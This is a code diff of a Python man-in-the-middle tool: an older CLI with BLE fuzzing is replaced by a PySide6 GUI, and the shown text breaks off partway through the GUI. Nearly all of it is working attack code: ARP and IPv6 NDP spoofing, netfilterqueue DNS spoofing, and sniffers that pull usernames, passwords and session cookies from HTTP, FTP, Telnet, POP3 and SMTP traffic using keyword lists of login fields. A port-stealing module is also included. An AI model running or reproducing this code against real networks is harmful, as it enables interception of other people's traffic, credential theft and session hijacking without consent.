@@ -1,334 +1,652 @@
 #!/usr/bin/env python3
 
-import argparse
-import threading
-from colorama import Fore, Style
-from time import strftime, localtime
-from scapy.all import arp_mitm, sniff, DNS, srp, Ether, ARP, send, IP, UDP, DNSRR
-from mac_vendor_lookup import MacLookup, VendorNotFoundError
 import os
-import platform
-import ctypes
-import subprocess
-import requests
+import sys
 import re
-import urllib.parse
-from prettytable import PrettyTable
-from bleak import BleakScanner, BleakClient
-import asyncio
-import random
+import threading
+from urllib.parse import unquote, parse_qs, unquote_plus
+import scapy.all as scapy
+from netfilterqueue import NetfilterQueue
+from PySide6.QtWidgets import (
+    QApplication, QWidget, QVBoxLayout, QPushButton, QHBoxLayout, QLabel,
+    QComboBox, QTextEdit, QTableWidget, QTableWidgetItem, QTabWidget, QHeaderView,
+    QAbstractItemView, QMessageBox, QLineEdit, QFormLayout
+)
+from PySide6.QtGui import QIcon
+from PySide6.QtCore import Qt, QThread, Signal
+import socket
+import time
+import traceback  # Added for better error output
 
-# Check platform and privileges
-if platform.system() == "Windows":
-    if not ctypes.windll.shell32.IsUserAnAdmin():
-        print(f"{Fore.RED}This script requires Administrator privileges. Please run as Administrator.{Style.RESET_ALL}")
-        exit(1)
-elif platform.system() == "Linux":
-    if os.geteuid() != 0:
-        print(f"{Fore.RED}This script requires root privileges. Please run with sudo.{Style.RESET_ALL}")
-        exit(1)
-else:
-    print(f"{Fore.RED}Unsupported OS: {platform.system()}{Style.RESET_ALL}")
-    exit(1)
+user_fields = [
+    "phone", "user_pass", "uname", "user_login", "user_name", "email",
+    "pseudonym", "userid", "login", "user", "username"
+]
+pass_fields = [
+    "pass", "passwd", "passwrd", "login_password", "pwd", "passphrase",
+    "password", "user_password", "pswd", "userpwd", "upass", "pwd1",
+    "secure_pass", "auth_pass", "mypassword", "account_password"
+]
 
-# Adjust argument parsing for BLE mode
-parser = argparse.ArgumentParser(description='Device network sniffer')
-parser.add_argument('-m', help='Mode: wifi or ble', required=True)
+def enable_ip_forward():
+    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 
-# Only require network and interface arguments if wifi mode is specified
-if parser.parse_args().m == 'wifi':
-    parser.add_argument('-n', help='Network to scan (e.g., "192.168.0.0/24")', required=True)
-    parser.add_argument('-i', help='Network interface to use', required=True)
-    parser.add_argument('-r', help='IP of your home router', required=True)
+def disable_ip_forward():
+    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
 
-opts = parser.parse_args()
+def enable_ipv6_forward():
+    os.system("echo 1 > /proc/sys/net/ipv6/conf/all/forwarding")
 
+def disable_ipv6_forward():
+    os.system("echo 0 > /proc/sys/net/ipv6/conf/all/forwarding")
 
-# DNS Spoofing for Multiple Targets
-class Device:
-    def __init__(self, routerip, targetip, iface):
-        self.routerip = routerip
-        self.targetip = targetip
-        self.iface = iface
+def get_mac(ip):
+    arp_request = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast / arp_request
+    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
+    if answered_list:
+        return answered_list[0][1].hwsrc
+    else:
+        return None
 
-    def mitm(self):
-        while True:
-            try:
-                arp_mitm(self.routerip, self.targetip, iface=self.iface)
-            except OSError:
-                print('IP seems down, retrying ..')
-                continue
+def get_vendor(mac):
+    try:
+        import requests
+        resp = requests.get(f"https://api.macvendors.com/{mac}", timeout=2)
+        if resp.status_code == 200:
+            return resp.text.strip()
+        return ""
+    except Exception:
+        return ""
 
-    def capture_dns(self):
-        sniff(iface=self.iface, prn=self.dns,
-              filter=f'src host {self.targetip} and udp port 53', store=0)
-
-    def dns(self, pkt):
-        record = pkt[DNS].qd.qname.decode('utf-8').strip('.')
-        time = strftime("%m/%d/%Y %H:%M:%S", localtime())
-        print(f'[{Fore.GREEN}{time} | {Fore.BLUE}{self.targetip} -> {Fore.RED}{record}{Style.RESET_ALL}]')
-
-    def arp_sniff(self):
-        def arp_pkt_callback(pkt):
-            if pkt.haslayer(ARP) and pkt[ARP].op == 1:
-                print(f'{Fore.YELLOW}ARP Sniff: {pkt[ARP].psrc} -> {pkt[ARP].pdst}{Style.RESET_ALL}')
-        sniff(iface=self.iface, prn=arp_pkt_callback,
-              filter=f'arp and host {self.targetip}', store=0)
-
-    def http_sniff(self):
-        def http_pkt_callback(pkt):
-            if pkt.haslayer('Raw'):
-                raw_data = pkt['Raw'].load.decode(errors='ignore')
-                login_fields = ['heslo', 'passwd', 'pwd', 'user_id', 'pseudonym', 'phone',
-                                'password', 'user', 'username', 'login', 'pass', 'uname','userPass']
-                creds_found = {}
-                url = "unknown"
-                show_dump = False
-
-                # Decode URL-encoded characters
-                raw_data = urllib.parse.unquote(raw_data)
-
-                # Extract Host and Path for full URL
-                if "Host:" in raw_data and "GET" in raw_data:
-                    try:
-                        host = raw_data.split("Host: ")[1].split("\r\n")[0]
-                        path = raw_data.split("GET ")[1].split(" HTTP")[0]
-                        url = f"http://{host}{path}"
-                        print(f"{Fore.CYAN}Visited URL: {url}{Style.RESET_ALL}")
-                    except Exception:
-                        pass
-
-                elif "Host:" in raw_data and "POST" in raw_data:
-                    try:
-                        host = raw_data.split("Host: ")[1].split("\r\n")[0]
-                        path = raw_data.split("POST ")[1].split(" HTTP")[0]
-                        url = f"http://{host}{path}"
-                    except Exception:
-                        pass
-
-                if "POST" in raw_data:
-                    # Lowercase search for login keywords
-                    for field in login_fields:
-                        regex = re.compile(rf'{field}=([^&\s]+)', re.IGNORECASE)
-                        match = regex.search(raw_data)
-                        if match:
-                            creds_found[field.lower()] = match.group(1)
-                            show_dump = True
-
-                    if show_dump:
-                        login = "-"
-                        pwd = "-"
-                        for key in creds_found:
-                            if key in ['user', 'username', 'login', 'uname', 'user_id', 'pseudonym', 'phone']:
-                                login = creds_found[key]
-                            if key in ['password', 'pass', 'pwd', 'passwd', 'heslo']:
-                                pwd = creds_found[key]
-
-                        print(f"{Fore.GREEN}Credential Dump:{Style.RESET_ALL}")
-                        print(f"{Fore.GREEN}    IP: {self.targetip} > LOGIN: {login}  PWD: {pwd}  SITE: {url}{Style.RESET_ALL}")
-                        print(f"{Fore.GREEN}    CONTENT: {raw_data.strip().replace(chr(13), '').replace(chr(10), '')}{Style.RESET_ALL}")
-
-                if "Set-Cookie:" in raw_data:
-                    cookies = raw_data.split("Set-Cookie: ")[1].split("\r\n")[0]
-                    print(f"{Fore.GREEN}Captured Cookie: {cookies}{Style.RESET_ALL}")
-
-        sniff(iface=self.iface, prn=http_pkt_callback,
-              filter=f'tcp port 80 and host {self.targetip}', store=0)
-
-    def enable_ip_forwarding(self):
-        subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
-        print(f'{Fore.GREEN}IP forwarding enabled!{Style.RESET_ALL}')
-
-    def set_iptables(self):
-        subprocess.call(f"iptables --flush", shell=True)
-        subprocess.call(f"iptables -A FORWARD -j NFQUEUE --queue-num 0", shell=True)
-        print(f'{Fore.GREEN}Iptables rules set to forward packets to NFQUEUE 0.{Style.RESET_ALL}')
-
-    def dns_poison(self, spoof_ips):
-        import netfilterqueue  # Import only when DNS poisoning is needed
-        
-        def dns_pkt_callback(pkt):
-            if pkt.haslayer(DNS) and pkt[DNS].qr == 0:
-                target_ip = pkt[DNS].qd.qname.decode('utf-8').strip('.')
-                if target_ip in spoof_ips:
-                    spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
-                                  UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
-                                  DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
-                                      an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=spoof_ips[target_ip]))
-                    send(spoofed_pkt, iface=self.iface, verbose=False)
-                    print(f'{Fore.RED}DNS Poison: Redirected {pkt[DNS].qd.qname.decode()} to {spoof_ips[target_ip]}{Style.RESET_ALL}')
-
-        nfqueue = netfilterqueue.NetfilterQueue()
-        nfqueue.bind(0, dns_pkt_callback)
-        print(f'{Fore.GREEN}Listening for DNS packets in NFQUEUE...{Style.RESET_ALL}')
-        nfqueue.run()
-
-    def sniff(self):
-        while True:
-            print(f'\n{Fore.GREEN}Select Your Choice:{Style.RESET_ALL}')
-            print(f'1. DNS Sniff\n2. HTTP Sniff\n3. DNS Poison\n4. ARP Sniff\n5. Exit')
-            try:
-                choice = int(input(f'{Fore.BLUE}Your choice: {Style.RESET_ALL}'))
-            except ValueError:
-                print(f"{Fore.RED}Invalid input! Please enter a number.{Style.RESET_ALL}")
-                continue
-            if choice == 1:
-                self.capture_dns()
-            elif choice == 2:
-                self.http_sniff()
-            elif choice == 3:
-                spoof_ips = {}
-                while True:
-                    target = input(f'{Fore.RED}Enter target domain (or "done" to finish): {Style.RESET_ALL}')
-                    if target == "done":
-                        break
-                    ip = input(f'{Fore.RED}Enter spoofed IP for {target}: {Style.RESET_ALL}')
-                    spoof_ips[target] = ip
-                self.dns_poison(spoof_ips)
-            elif choice == 4:
-                self.arp_sniff()
-            elif choice == 5:
-                print(f'{Fore.YELLOW}Exiting...{Style.RESET_ALL}')
-                break
-            else:
-                print(f'{Fore.RED}Invalid choice, try again.{Style.RESET_ALL}')
-
-def arp_scan(network, iface):
-    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network),
-                 timeout=5, iface=iface, verbose=False)
+def scan_network(interface, log_cb, ipv6=False):
     devices = []
-    print(f'\n{Fore.RED}######## NETWORK DEVICES ########{Style.RESET_ALL}\n')
-    for i in ans:
-        mac = i.answer[ARP].hwsrc
-        ip = i.answer[ARP].psrc
-        try:
-            vendor = MacLookup().lookup(mac)
-        except VendorNotFoundError:
-            vendor = 'unrecognized device'
-        devices.append((ip, mac, vendor))
-        print(f'{Fore.BLUE}{ip}{Style.RESET_ALL} ({mac}, {vendor})')
-    print(f'{Fore.YELLOW}0. Exit{Style.RESET_ALL}')
-    return input('\nPick a device IP: ')
-
-class BLEHandler:
-    def __init__(self):
-        self.devices = {}
-
-    async def scan_start(self):
-        print(f"[{strftime('%H:%M:%S')}] Starting BLE Recon...")
-        devices = await BleakScanner.discover(timeout=20)
-        for device in devices:
-            mac = device.address
-            rssi = device.rssi
-            self.devices[mac] = {
-                "name": device.name or "Unknown",
-                "advertisement": device.metadata.get("manufacturer_data", {}),
-                "last_seen": strftime('%Y-%m-%d %H:%M:%S'),
-                "rssi": rssi
-            }
-            print(f"[{strftime('%H:%M:%S')}] New BLE device detected: {mac} ({rssi} dBm)")
-
-    def show_devices(self):
-        table = PrettyTable(["Device Name", "MAC Address", "Advertisement Data", "Last Seen"])
-        for mac, info in self.devices.items():
-            table.add_row([info["name"], mac, info["advertisement"], info["last_seen"]])
-        print(table)
-
-    async def enum_device(self, mac):
-        print(f"Connecting to {mac}...")
-        try:
-            async with BleakClient(mac) as client:
-                for service in client.services:
-                    print(f"Service: {service.uuid}")
-                    for characteristic in service.characteristics:
-                        print(f"\tCharacteristic: {characteristic.uuid} (Properties: {characteristic.properties})")
-        except Exception as e:
-            print(f"Error: {e}")
-            print(f"Disconnecting from {mac}...")
-
-    async def fuzz(self, mac, uuid):
-        try:
-            async with BleakClient(mac) as client:
-                print(f"Connected to {mac}, starting fuzz on characteristic {uuid}")
-                for _ in range(20):  # Number of fuzz attempts
-                    # Create random malformed data (e.g., 1–20 random bytes)
-                    length = random.randint(1, 20)
-                    malformed_data = bytes([random.randint(0, 255) for _ in range(length)])
-                    try:
-                        await client.write_gatt_char(uuid, malformed_data)
-                        print(f"Sent: {malformed_data.hex()}")
-                    except Exception as write_err:
-                        print(f"Write failed: {write_err}")
-        except Exception as e:
-            print(f"Connection failed: {e}")
-            
-    async def subscribe(self, mac, uuid):
-        async def notification_handler(sender, data):
-            print(f"Notification from {sender}: {data}")
-
-        try:
-            async with BleakClient(mac) as client:
-                print(f"Connected to {mac}, subscribing to characteristic {uuid}...")
-                await client.start_notify(uuid, notification_handler)
-                print("Subscribed! Listening for notifications... (Press Ctrl+C to stop)")
-                while True:
-                    await asyncio.sleep(1)
-        except Exception as e:
-            print(f"Subscription failed: {e}")
-            
-    async def write_data(self, mac, uuid, data):
-        try:
-            async with BleakClient(mac) as client:
-                await client.write_gatt_char(uuid, bytes.fromhex(data))
-                print(f"Written data {data} to {uuid}")
-        except Exception as e:
-            print(f"Error during write: {e}")
-
-    async def disconnect(self, mac):
-        print(f"Disconnecting from {mac}...")
-        # Bleak automatically disconnects when the client context ends.
-
-def main():
-    if opts.m == "wifi":
-        while True:
-            targetip = arp_scan(opts.network, opts.iface)
-            if targetip == "0":
-                print(f'{Fore.YELLOW}Exiting...{Style.RESET_ALL}')
-                break
-            device = Device(opts.routerip, targetip, opts.iface)
-            device.enable_ip_forwarding()
+    try:
+        if ipv6:
+            log_cb("Starting IPv6 scan...")
             try:
-                device.sniff()
-            except KeyboardInterrupt:
-                print(f'\n{Fore.CYAN}Returning to menu...{Style.RESET_ALL}')
-                continue
-    elif opts.m == "ble":
-        ble_handler = BLEHandler()
-        while True:
-            command = input("root@base~$ ")
-            if command == "ble.scan start":
-                asyncio.run(ble_handler.scan_start())
-            elif command == "ble.show":
-                ble_handler.show_devices()
-            elif command.startswith("ble.enum"):
-                _, mac = command.split()
-                asyncio.run(ble_handler.enum_device(mac))
-            elif command.startswith("ble.fuzz"):
-                _, mac, uuid = command.split()
-                asyncio.run(ble_handler.fuzz(mac, uuid))
-            elif command.startswith("ble.subscribe"):
-                _, mac, uuid = command.split()
-                asyncio.run(ble_handler.subscribe(mac, uuid))
-            elif command.startswith("ble.write"):
-                _, mac, uuid, data = command.split()
-                asyncio.run(ble_handler.write_data(mac, uuid, data))
-            elif command.startswith("ble.disconnect"):
-                _, mac = command.split()
-                asyncio.run(ble_handler.disconnect(mac))
-            elif command == "exit":
-                break
-            else:
-                print(f"Unknown command: {command}")
+                ans, _ = scapy.srp(
+                    scapy.Ether(dst="33:33:00:00:00:01") / scapy.IPv6(dst="ff02::1") / scapy.ICMPv6ND_NS(),
+                    timeout=3, iface=interface, verbose=False
+                )
+                for snd, rcv in ans:
+                    ip = rcv[scapy.IPv6].src
+                    mac = rcv[scapy.Ether].src
+                    vendor = get_vendor(mac)
+                    devices.append((ip, mac, vendor))
+            except Exception as ex:
+                log_cb(f"IPv6 scan failed: {ex}")
+        else:
+            log_cb("Starting IPv4 scan...")
+            iface_ip = scapy.get_if_addr(interface)
+            if iface_ip == "0.0.0.0":
+                log_cb(f"Interface {interface} has no IP address.")
+                return devices
+            net = ".".join(iface_ip.split(".")[:3]) + ".1/24"
+            answered, _ = scapy.arping(net, iface=interface, timeout=2, verbose=False)
+            for snd, rcv in answered:
+                ip = rcv.psrc
+                mac = rcv.hwsrc
+                vendor = get_vendor(mac)
+                devices.append((ip, mac, vendor))
+    except Exception as e:
+        log_cb(f"Network scan error: {e}")
+    return devices
+
+def spoof(target_ip, spoof_ip):
+    target_mac = get_mac(target_ip)
+    if not target_mac:
+        return False
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    scapy.send(packet, verbose=False)
+    return True
+
+def restore(target_ip, source_ip):
+    target_mac = get_mac(target_ip)
+    source_mac = get_mac(source_ip)
+    if not target_mac or not source_mac:
+        return
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,
+                       psrc=source_ip, hwsrc=source_mac)
+    scapy.send(packet, count=5, verbose=False)
+
+def ndp_spoof(target_ipv6, router_ipv6, iface, stop_event, log_cb):
+    log_cb("Starting NDP spoofing...")
+    router_mac = scapy.get_if_hwaddr(iface)
+    target_mac = get_mac_v6(target_ipv6, iface)
+    if not target_mac:
+        log_cb(f"Failed to get target MAC for {target_ipv6}")
+        return
+    pkt = scapy.Ether(dst=target_mac) / scapy.IPv6(dst=target_ipv6, src=router_ipv6) / \
+        scapy.ICMPv6ND_NA(tgt=router_ipv6, R=0, S=1, O=1) / \
+        scapy.ICMPv6NDOptDstLLAddr(lladdr=router_mac)
+    try:
+        while not stop_event.is_set():
+            scapy.sendp(pkt, iface=iface, verbose=False)
+            time.sleep(2)
+    except Exception as e:
+        log_cb(f"NDP spoofing error: {e}")
+
+def get_mac_v6(ipv6, iface):
+    ns = scapy.Ether(dst="33:33:ff:" + ":".join(ipv6.split(":")[-3:])) / \
+        scapy.IPv6(dst=ipv6) / scapy.ICMPv6ND_NS(tgt=ipv6)
+    ans = scapy.srp(ns, iface=iface, timeout=2, verbose=False)[0]
+    for snd, rcv in ans:
+        if scapy.ICMPv6ND_NA in rcv:
+            return rcv[scapy.Ether].src
+    return None
+
+class MITMThread(QThread):
+    log = Signal(str)
+    finished = Signal()
+    def __init__(self, targets, router_ip, iface, dns_spoof_domains=None, dns_spoof_ip=None):
+        super().__init__()
+        self.targets = targets
+        self.router_ip = router_ip
+        self.iface = iface
+        self._stop_event = threading.Event()
+        self.dns_spoof_domains = dns_spoof_domains or []
+        self.dns_spoof_ip = dns_spoof_ip
+
+    def run(self):
+        self.log.emit("Starting ARP spoofing (MITM)...")
+        try:
+            while not self._stop_event.is_set():
+                for target_ip in self.targets:
+                    spoof(target_ip, self.router_ip)
+                    spoof(self.router_ip, target_ip)
+                time.sleep(2)
+        except Exception as e:
+            self.log.emit(f"MITM error: {e}")
+        finally:
+            self.log.emit("Restoring ARP tables...")
+            for target_ip in self.targets:
+                restore(target_ip, self.router_ip)
+                restore(self.router_ip, target_ip)
+            self.finished.emit()
+
+    def stop(self):
+        self._stop_event.set()
+
+class NDPSpoofThread(QThread):
+    log = Signal(str)
+    finished = Signal()
+    def __init__(self, targets, router_v6, iface):
+        super().__init__()
+        self.targets = targets
+        self.router_v6 = router_v6
+        self.iface = iface
+        self._stop_event = threading.Event()
+
+    def run(self):
+        self.log.emit("Starting NDP spoofing (IPv6 MITM)...")
+        try:
+            for target in self.targets:
+                ndp_spoof(target, self.router_v6, self.iface, self._stop_event, self.log.emit)
+        except Exception as e:
+            self.log.emit(f"NDP MITM error: {e}")
+        finally:
+            self.finished.emit()
+
+    def stop(self):
+        self._stop_event.set()
+
+class DNSPacketInterceptor:
+    def __init__(self, domains_to_spoof, spoof_ip, log_cb):
+        self.domains_to_spoof = domains_to_spoof
+        self.spoof_ip = spoof_ip
+        self.log_cb = log_cb
+
+    def intercept(self, packet):
+        try:
+            scapy_packet = scapy.IP(packet.get_payload())
+            if scapy_packet.haslayer(scapy.DNSQR):
+                qname = scapy_packet[scapy.DNSQR].qname.decode()
+                self.log_cb(f"DNS Query: {qname}")
+                spoofed = False
+                for domain in self.domains_to_spoof:
+                    if domain in qname:
+                        spoofed = True
+                        break
+                if spoofed:
+                    self.log_cb(f"DNS Spoofing: {qname} -> {self.spoof_ip}")
+                    answer = scapy.DNSRR(rrname=scapy_packet[scapy.DNSQR].qname, rdata=self.spoof_ip)
+                    dns = scapy.DNS(
+                        id=scapy_packet[scapy.DNS].id,
+                        qr=1, aa=1, qd=scapy_packet[scapy.DNS].qd,
+                        an=answer, ancount=1
+                    )
+                    newpkt = scapy.IP(dst=scapy_packet[scapy.IP].src, src=scapy_packet[scapy.IP].dst) / \
+                        scapy.UDP(dport=scapy_packet[scapy.UDP].sport, sport=53) / dns
+                    packet.set_payload(bytes(newpkt))
+        except Exception as e:
+            self.log_cb(f"DNSPacketInterceptor error: {e}")
+        packet.accept()
+
+class PacketCaptureThread(QThread):
+    log = Signal(str)
+    finished = Signal()
+    def __init__(self, targets, iface, dns_spoof_domains=None, dns_spoof_ip=None, queue_num=1):
+        super().__init__()
+        self.targets = targets
+        self.iface = iface
+        self._stop_event = threading.Event()
+        self.nfqueue = NetfilterQueue()
+        self._iptables_set = False
+        self.dns_interceptor = DNSPacketInterceptor(dns_spoof_domains or [], dns_spoof_ip, self.log.emit)
+        self.session_hijacked = set()
+        self.capture_protocols = {
+            21: 'FTP', 23: 'TELNET', 25: 'SMTP', 110: 'POP3', 143: 'IMAP'
+        }
+        self.queue_num = queue_num  # Make queue number configurable
+
+    def process_packet(self, packet):
+        try:
+            scapy_packet = scapy.IP(packet.get_payload())
+            # DNS spoof and sniff
+            if scapy_packet.haslayer(scapy.DNSQR):
+                self.dns_interceptor.intercept(packet)
+                return
+            # HTTP/FTP/POP3/SMTP/TELNET sniffing
+            if scapy_packet.haslayer(scapy.TCP):
+                dport = scapy_packet[scapy.TCP].dport
+                sport = scapy_packet[scapy.TCP].sport
+                proto = self.capture_protocols.get(dport) or self.capture_protocols.get(sport)
+                if proto:
+                    if scapy_packet.haslayer(scapy.Raw):
+                        payload = scapy_packet[scapy.Raw].load.decode('latin-1', errors='ignore')
+                        self.log.emit(f"[{proto}] {scapy_packet[scapy.IP].src}:{sport}->{dport}: {payload.strip()}")
+                        if proto in ["FTP", "TELNET", "POP3", "SMTP"]:
+                            if "USER" in payload or "PASS" in payload:
+                                self.log.emit(f"[HIJACK] Possible credentials: {payload.strip()}")
+                # HTTP session hijack (Cookie theft) and full HTTP decode
+                if dport == 80 or sport == 80:
+                    if scapy_packet.haslayer(scapy.Raw):
+                        payload = scapy_packet[scapy.Raw].load.decode('latin-1', errors='ignore')
+                        lines = payload.split("\r\n")
+                        if lines:
+                            request_line = lines[0]
+                            if request_line.startswith(("GET", "POST", "HEAD", "PUT", "DELETE", "OPTIONS", "PATCH")):
+                                self.log.emit(f"[HTTP] Request: {request_line}")
+                                method, path, *_ = request_line.split()
+                                host = None
+                                headers = {}
+                                i = 1
+                                while i < len(lines) and lines[i]:
+                                    if ": " in lines[i]:
+                                        key, value = lines[i].split(": ", 1)
+                                        headers[key] = value
+                                        if key.lower() == "host":
+                                            host = value
+                                    i += 1
+                                for k, v in headers.items():
+                                    self.log.emit(f"[HTTP] Header: {k}: {v}")
+                                if host:
+                                    url = f"http://{host}{path}"
+                                    self.log.emit(f"[HTTP] Full URL: {url}")
+                                if method == "GET" and "?" in path:
+                                    params = path.split("?", 1)[1]
+                                    parsed = parse_qs(params)
+                                    self.log.emit(f"[HTTP] GET Params: {parsed}")
+                                if "Cookie" in headers:
+                                    self.log.emit(f"[HTTP] Cookies: {headers['Cookie']}")
+                                    if (scapy_packet[scapy.IP].src, scapy_packet[scapy.IP].dst) not in self.session_hijacked:
+                                        self.session_hijacked.add((scapy_packet[scapy.IP].src, scapy_packet[scapy.IP].dst))
+                                        self.log.emit(f"[SESSION HIJACK] Cookie: {headers['Cookie']}")
+                                if method == "POST":
+                                    if "" in lines:
+                                        idx = lines.index("")
+                                        post_body = "\r\n".join(lines[idx+1:])
+                                        parsed_post = parse_qs(post_body)
+                                        self.log.emit(f"[HTTP] POST Data: {parsed_post}")
+            packet.accept()
+        except Exception as ex:
+            self.log.emit(f"Packet processing error: {ex}")
+            packet.accept()
+
+    def run(self):
+        try:
+            os.system("modprobe nfnetlink_queue")  # Ensure kernel module is loaded
+            enable_ip_forward()
+            self._iptables_set = True
+            for target in self.targets:
+                os.system(f"iptables -I FORWARD -i {self.iface} -s {target} -j NFQUEUE --queue-num {self.queue_num}")
+                os.system(f"iptables -I FORWARD -o {self.iface} -d {target} -j NFQUEUE --queue-num {self.queue_num}")
+            self.log.emit("Packet capture started. MITM running.")
+            try:
+                self.nfqueue.bind(self.queue_num, self.process_packet)
+            except Exception as queue_ex:
+                self.log.emit(f"Capture error: Failed to create queue {self.queue_num}. Is another program using it? Is the kernel module loaded?")
+                self.log.emit("Full traceback:\n" + traceback.format_exc())
+                return
+            self.nfqueue.run()
+        except Exception as ex:
+            self.log.emit(f"Capture error: {ex}\n{traceback.format_exc()}")
+        finally:
+            try:
+                self.nfqueue.unbind()
+            except:
+                pass
+            if self._iptables_set:
+                for target in self.targets:
+                    os.system(f"iptables -D FORWARD -i {self.iface} -s {target} -j NFQUEUE --queue-num {self.queue_num}")
+                    os.system(f"iptables -D FORWARD -o {self.iface} -d {target} -j NFQUEUE --queue-num {self.queue_num}")
+            disable_ip_forward()
+            self.finished.emit()
+
+    def stop(self):
+        try:
+            self.nfqueue.unbind()
+        except:
+            pass
+        self._stop_event.set()
+
+class PortStealerThread(QThread):
+    log = Signal(str)
+    finished = Signal()
+    def __init__(self, iface, targets, port=80):
+        super().__init__()
+        self.iface = iface
+        self.targets = targets
+        self.port = port
+        self._stop = threading.Event()
+        self._server_socket = None
+
+    def run(self):
+        self.log.emit(f"Starting port stealing on port {self.port} (advanced)...")
+        try:
+            for t in self.targets:
+                spoof(t, scapy.get_if_addr(self.iface))
+            self._server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self._server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            self._server_socket.bind(('', self.port))
+            self._server_socket.listen(5)
+            self.log.emit(f"Bound to port {self.port}, now accepting connections for stealing...")
+            self._server_socket.settimeout(1.0)
+            while not self._stop.is_set():
+                try:
+                    conn, addr = self._server_socket.accept()
+                    self.log.emit(f"Connection from {addr}")
+                    conn.close()
+                except socket.timeout:
+                    continue
+        except Exception as e:
+            self.log.emit(f"Error in port stealer: {e}")
+        finally:
+            if self._server_socket:
+                try:
+                    self._server_socket.close()
+                except:
+                    pass
+            self.finished.emit()
+
+    def stop(self):
+        self._stop.set()
+        if self._server_socket:
+            try:
+                self._server_socket.close()
+            except Exception:
+                pass
+
+class MainWindow(QWidget):
+    def __init__(self):
+        super().__init__()
+        self.setWindowTitle("Network Scanner & MITM GUI")
+        self.setWindowIcon(QIcon.fromTheme("network-workgroup"))
+        self.resize(1100, 800)
+        self.tabs = QTabWidget()
+        self.scan_tab = QWidget()
+        self.portsteal_tab = QWidget()
+        self.ndp_tab = QWidget()
+        self.tabs.addTab(self.scan_tab, QIcon.fromTheme("network-wireless"), "Scanner / MITM")
+        self.tabs.addTab(self.portsteal_tab, QIcon.fromTheme("network-server"), "Port Stealer")
+        self.tabs.addTab(self.ndp_tab, QIcon.fromTheme("network-vpn"), "NDP Spoof (IPv6)")
+
+        self.init_scan_tab()
+        self.init_portsteal_tab()
+        self.init_ndp_tab()
+
+        main_layout = QVBoxLayout()
+        main_layout.addWidget(self.tabs)
+        self.setLayout(main_layout)
+
+        self.current_iface = None
+        self.devices = []
+        self.selected_router = None
+        self.selected_targets = []
+        self.selected_router_v6 = None
+        self.selected_targets_v6 = []
+        self.mitm_thread = None
+        self.capture_thread = None
+        self.portsteal_thread = None
+        self.ndp_thread = None
+
+    def init_scan_tab(self):
+        layout = QVBoxLayout()
+        iface_layout = QHBoxLayout()
+        iface_label = QLabel("Interface:")
+        self.iface_box = QComboBox()
+        for iface in scapy.get_if_list():
+            self.iface_box.addItem(iface)
+        iface_layout.addWidget(iface_label)
+        iface_layout.addWidget(self.iface_box)
+        self.scan_ipv4_btn = QPushButton(QIcon.fromTheme("network-wireless"), "Scan IPv4")
+        self.scan_ipv6_btn = QPushButton(QIcon.fromTheme("network-vpn"), "Scan IPv6")
+        iface_layout.addWidget(self.scan_ipv4_btn)
+        iface_layout.addWidget(self.scan_ipv6_btn)
+        layout.addLayout(iface_layout)
+
+        self.device_table = QTableWidget(0, 3)
+        self.device_table.setHorizontalHeaderLabels(["IP", "MAC", "Vendor"])
+        self.device_table.setSelectionBehavior(QAbstractItemView.SelectRows)
+        self.device_table.setEditTriggers(QAbstractItemView.NoEditTriggers)
+        self.device_table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
+        layout.addWidget(self.device_table)
+
+        sel_layout = QHBoxLayout()
+        self.router_lbl = QLabel("Router: None")
+        self.targets_lbl = QLabel("Targets: None")
+        sel_layout.addWidget(self.router_lbl)
+        sel_layout.addWidget(self.targets_lbl)
+        layout.addLayout(sel_layout)
+
+        self.dns_spoof_form = QFormLayout()
+        self.dns_domain_line = QLineEdit()
+        self.dns_ip_line = QLineEdit()
+        self.dns_spoof_form.addRow("Domain to spoof (comma separated):", self.dns_domain_line)
+        self.dns_spoof_form.addRow("Fake IP for DNS spoof:", self.dns_ip_line)
+        layout.addLayout(self.dns_spoof_form)
+
+        btn_layout = QHBoxLayout()
+        self.set_router_btn = QPushButton(QIcon.fromTheme("network-server"), "Set as Router")
+        self.add_target_btn = QPushButton(QIcon.fromTheme("user-group-properties"), "Add as Target")
+        self.start_mitm_btn = QPushButton(QIcon.fromTheme("media-playback-start"), "Start MITM + Capture")
+        self.stop_mitm_btn = QPushButton(QIcon.fromTheme("media-playback-stop"), "Stop")
+        btn_layout.addWidget(self.set_router_btn)
+        btn_layout.addWidget(self.add_target_btn)
+        btn_layout.addWidget(self.start_mitm_btn)
+        btn_layout.addWidget(self.stop_mitm_btn)
+        layout.addLayout(btn_layout)
+
+        self.log_text = QTextEdit()
+        self.log_text.setReadOnly(True)
+        layout.addWidget(QLabel("Activity Log:"))
+        layout.addWidget(self.log_text)
+
+        self.scan_tab.setLayout(layout)
+
+        self.scan_ipv4_btn.clicked.connect(lambda: self.do_scan(ipv6=False))
+        self.scan_ipv6_btn.clicked.connect(lambda: self.do_scan(ipv6=True))
+        self.set_router_btn.clicked.connect(self.set_as_router)
+        self.add_target_btn.clicked.connect(self.add_as_target)
+        self.start_mitm_btn.clicked.connect(self.start_mitm)
+        self.stop_mitm_btn.clicked.connect(self.stop_mitm)
+
+    def init_portsteal_tab(self):
+        layout = QVBoxLayout()
+        self.portsteal_start_btn = QPushButton(QIcon.fromTheme("media-record"), "Start Port Stealing")
+        self.portsteal_stop_btn = QPushButton(QIcon.fromTheme("media-playback-stop"), "Stop")
+        self.portsteal_log = QTextEdit()
+        self.portsteal_log.setReadOnly(True)
+        layout.addWidget(self.portsteal_start_btn)
+        layout.addWidget(self.portsteal_stop_btn)
+        layout.addWidget(QLabel("Port Stealer Log:"))
+        layout.addWidget(self.portsteal_log)
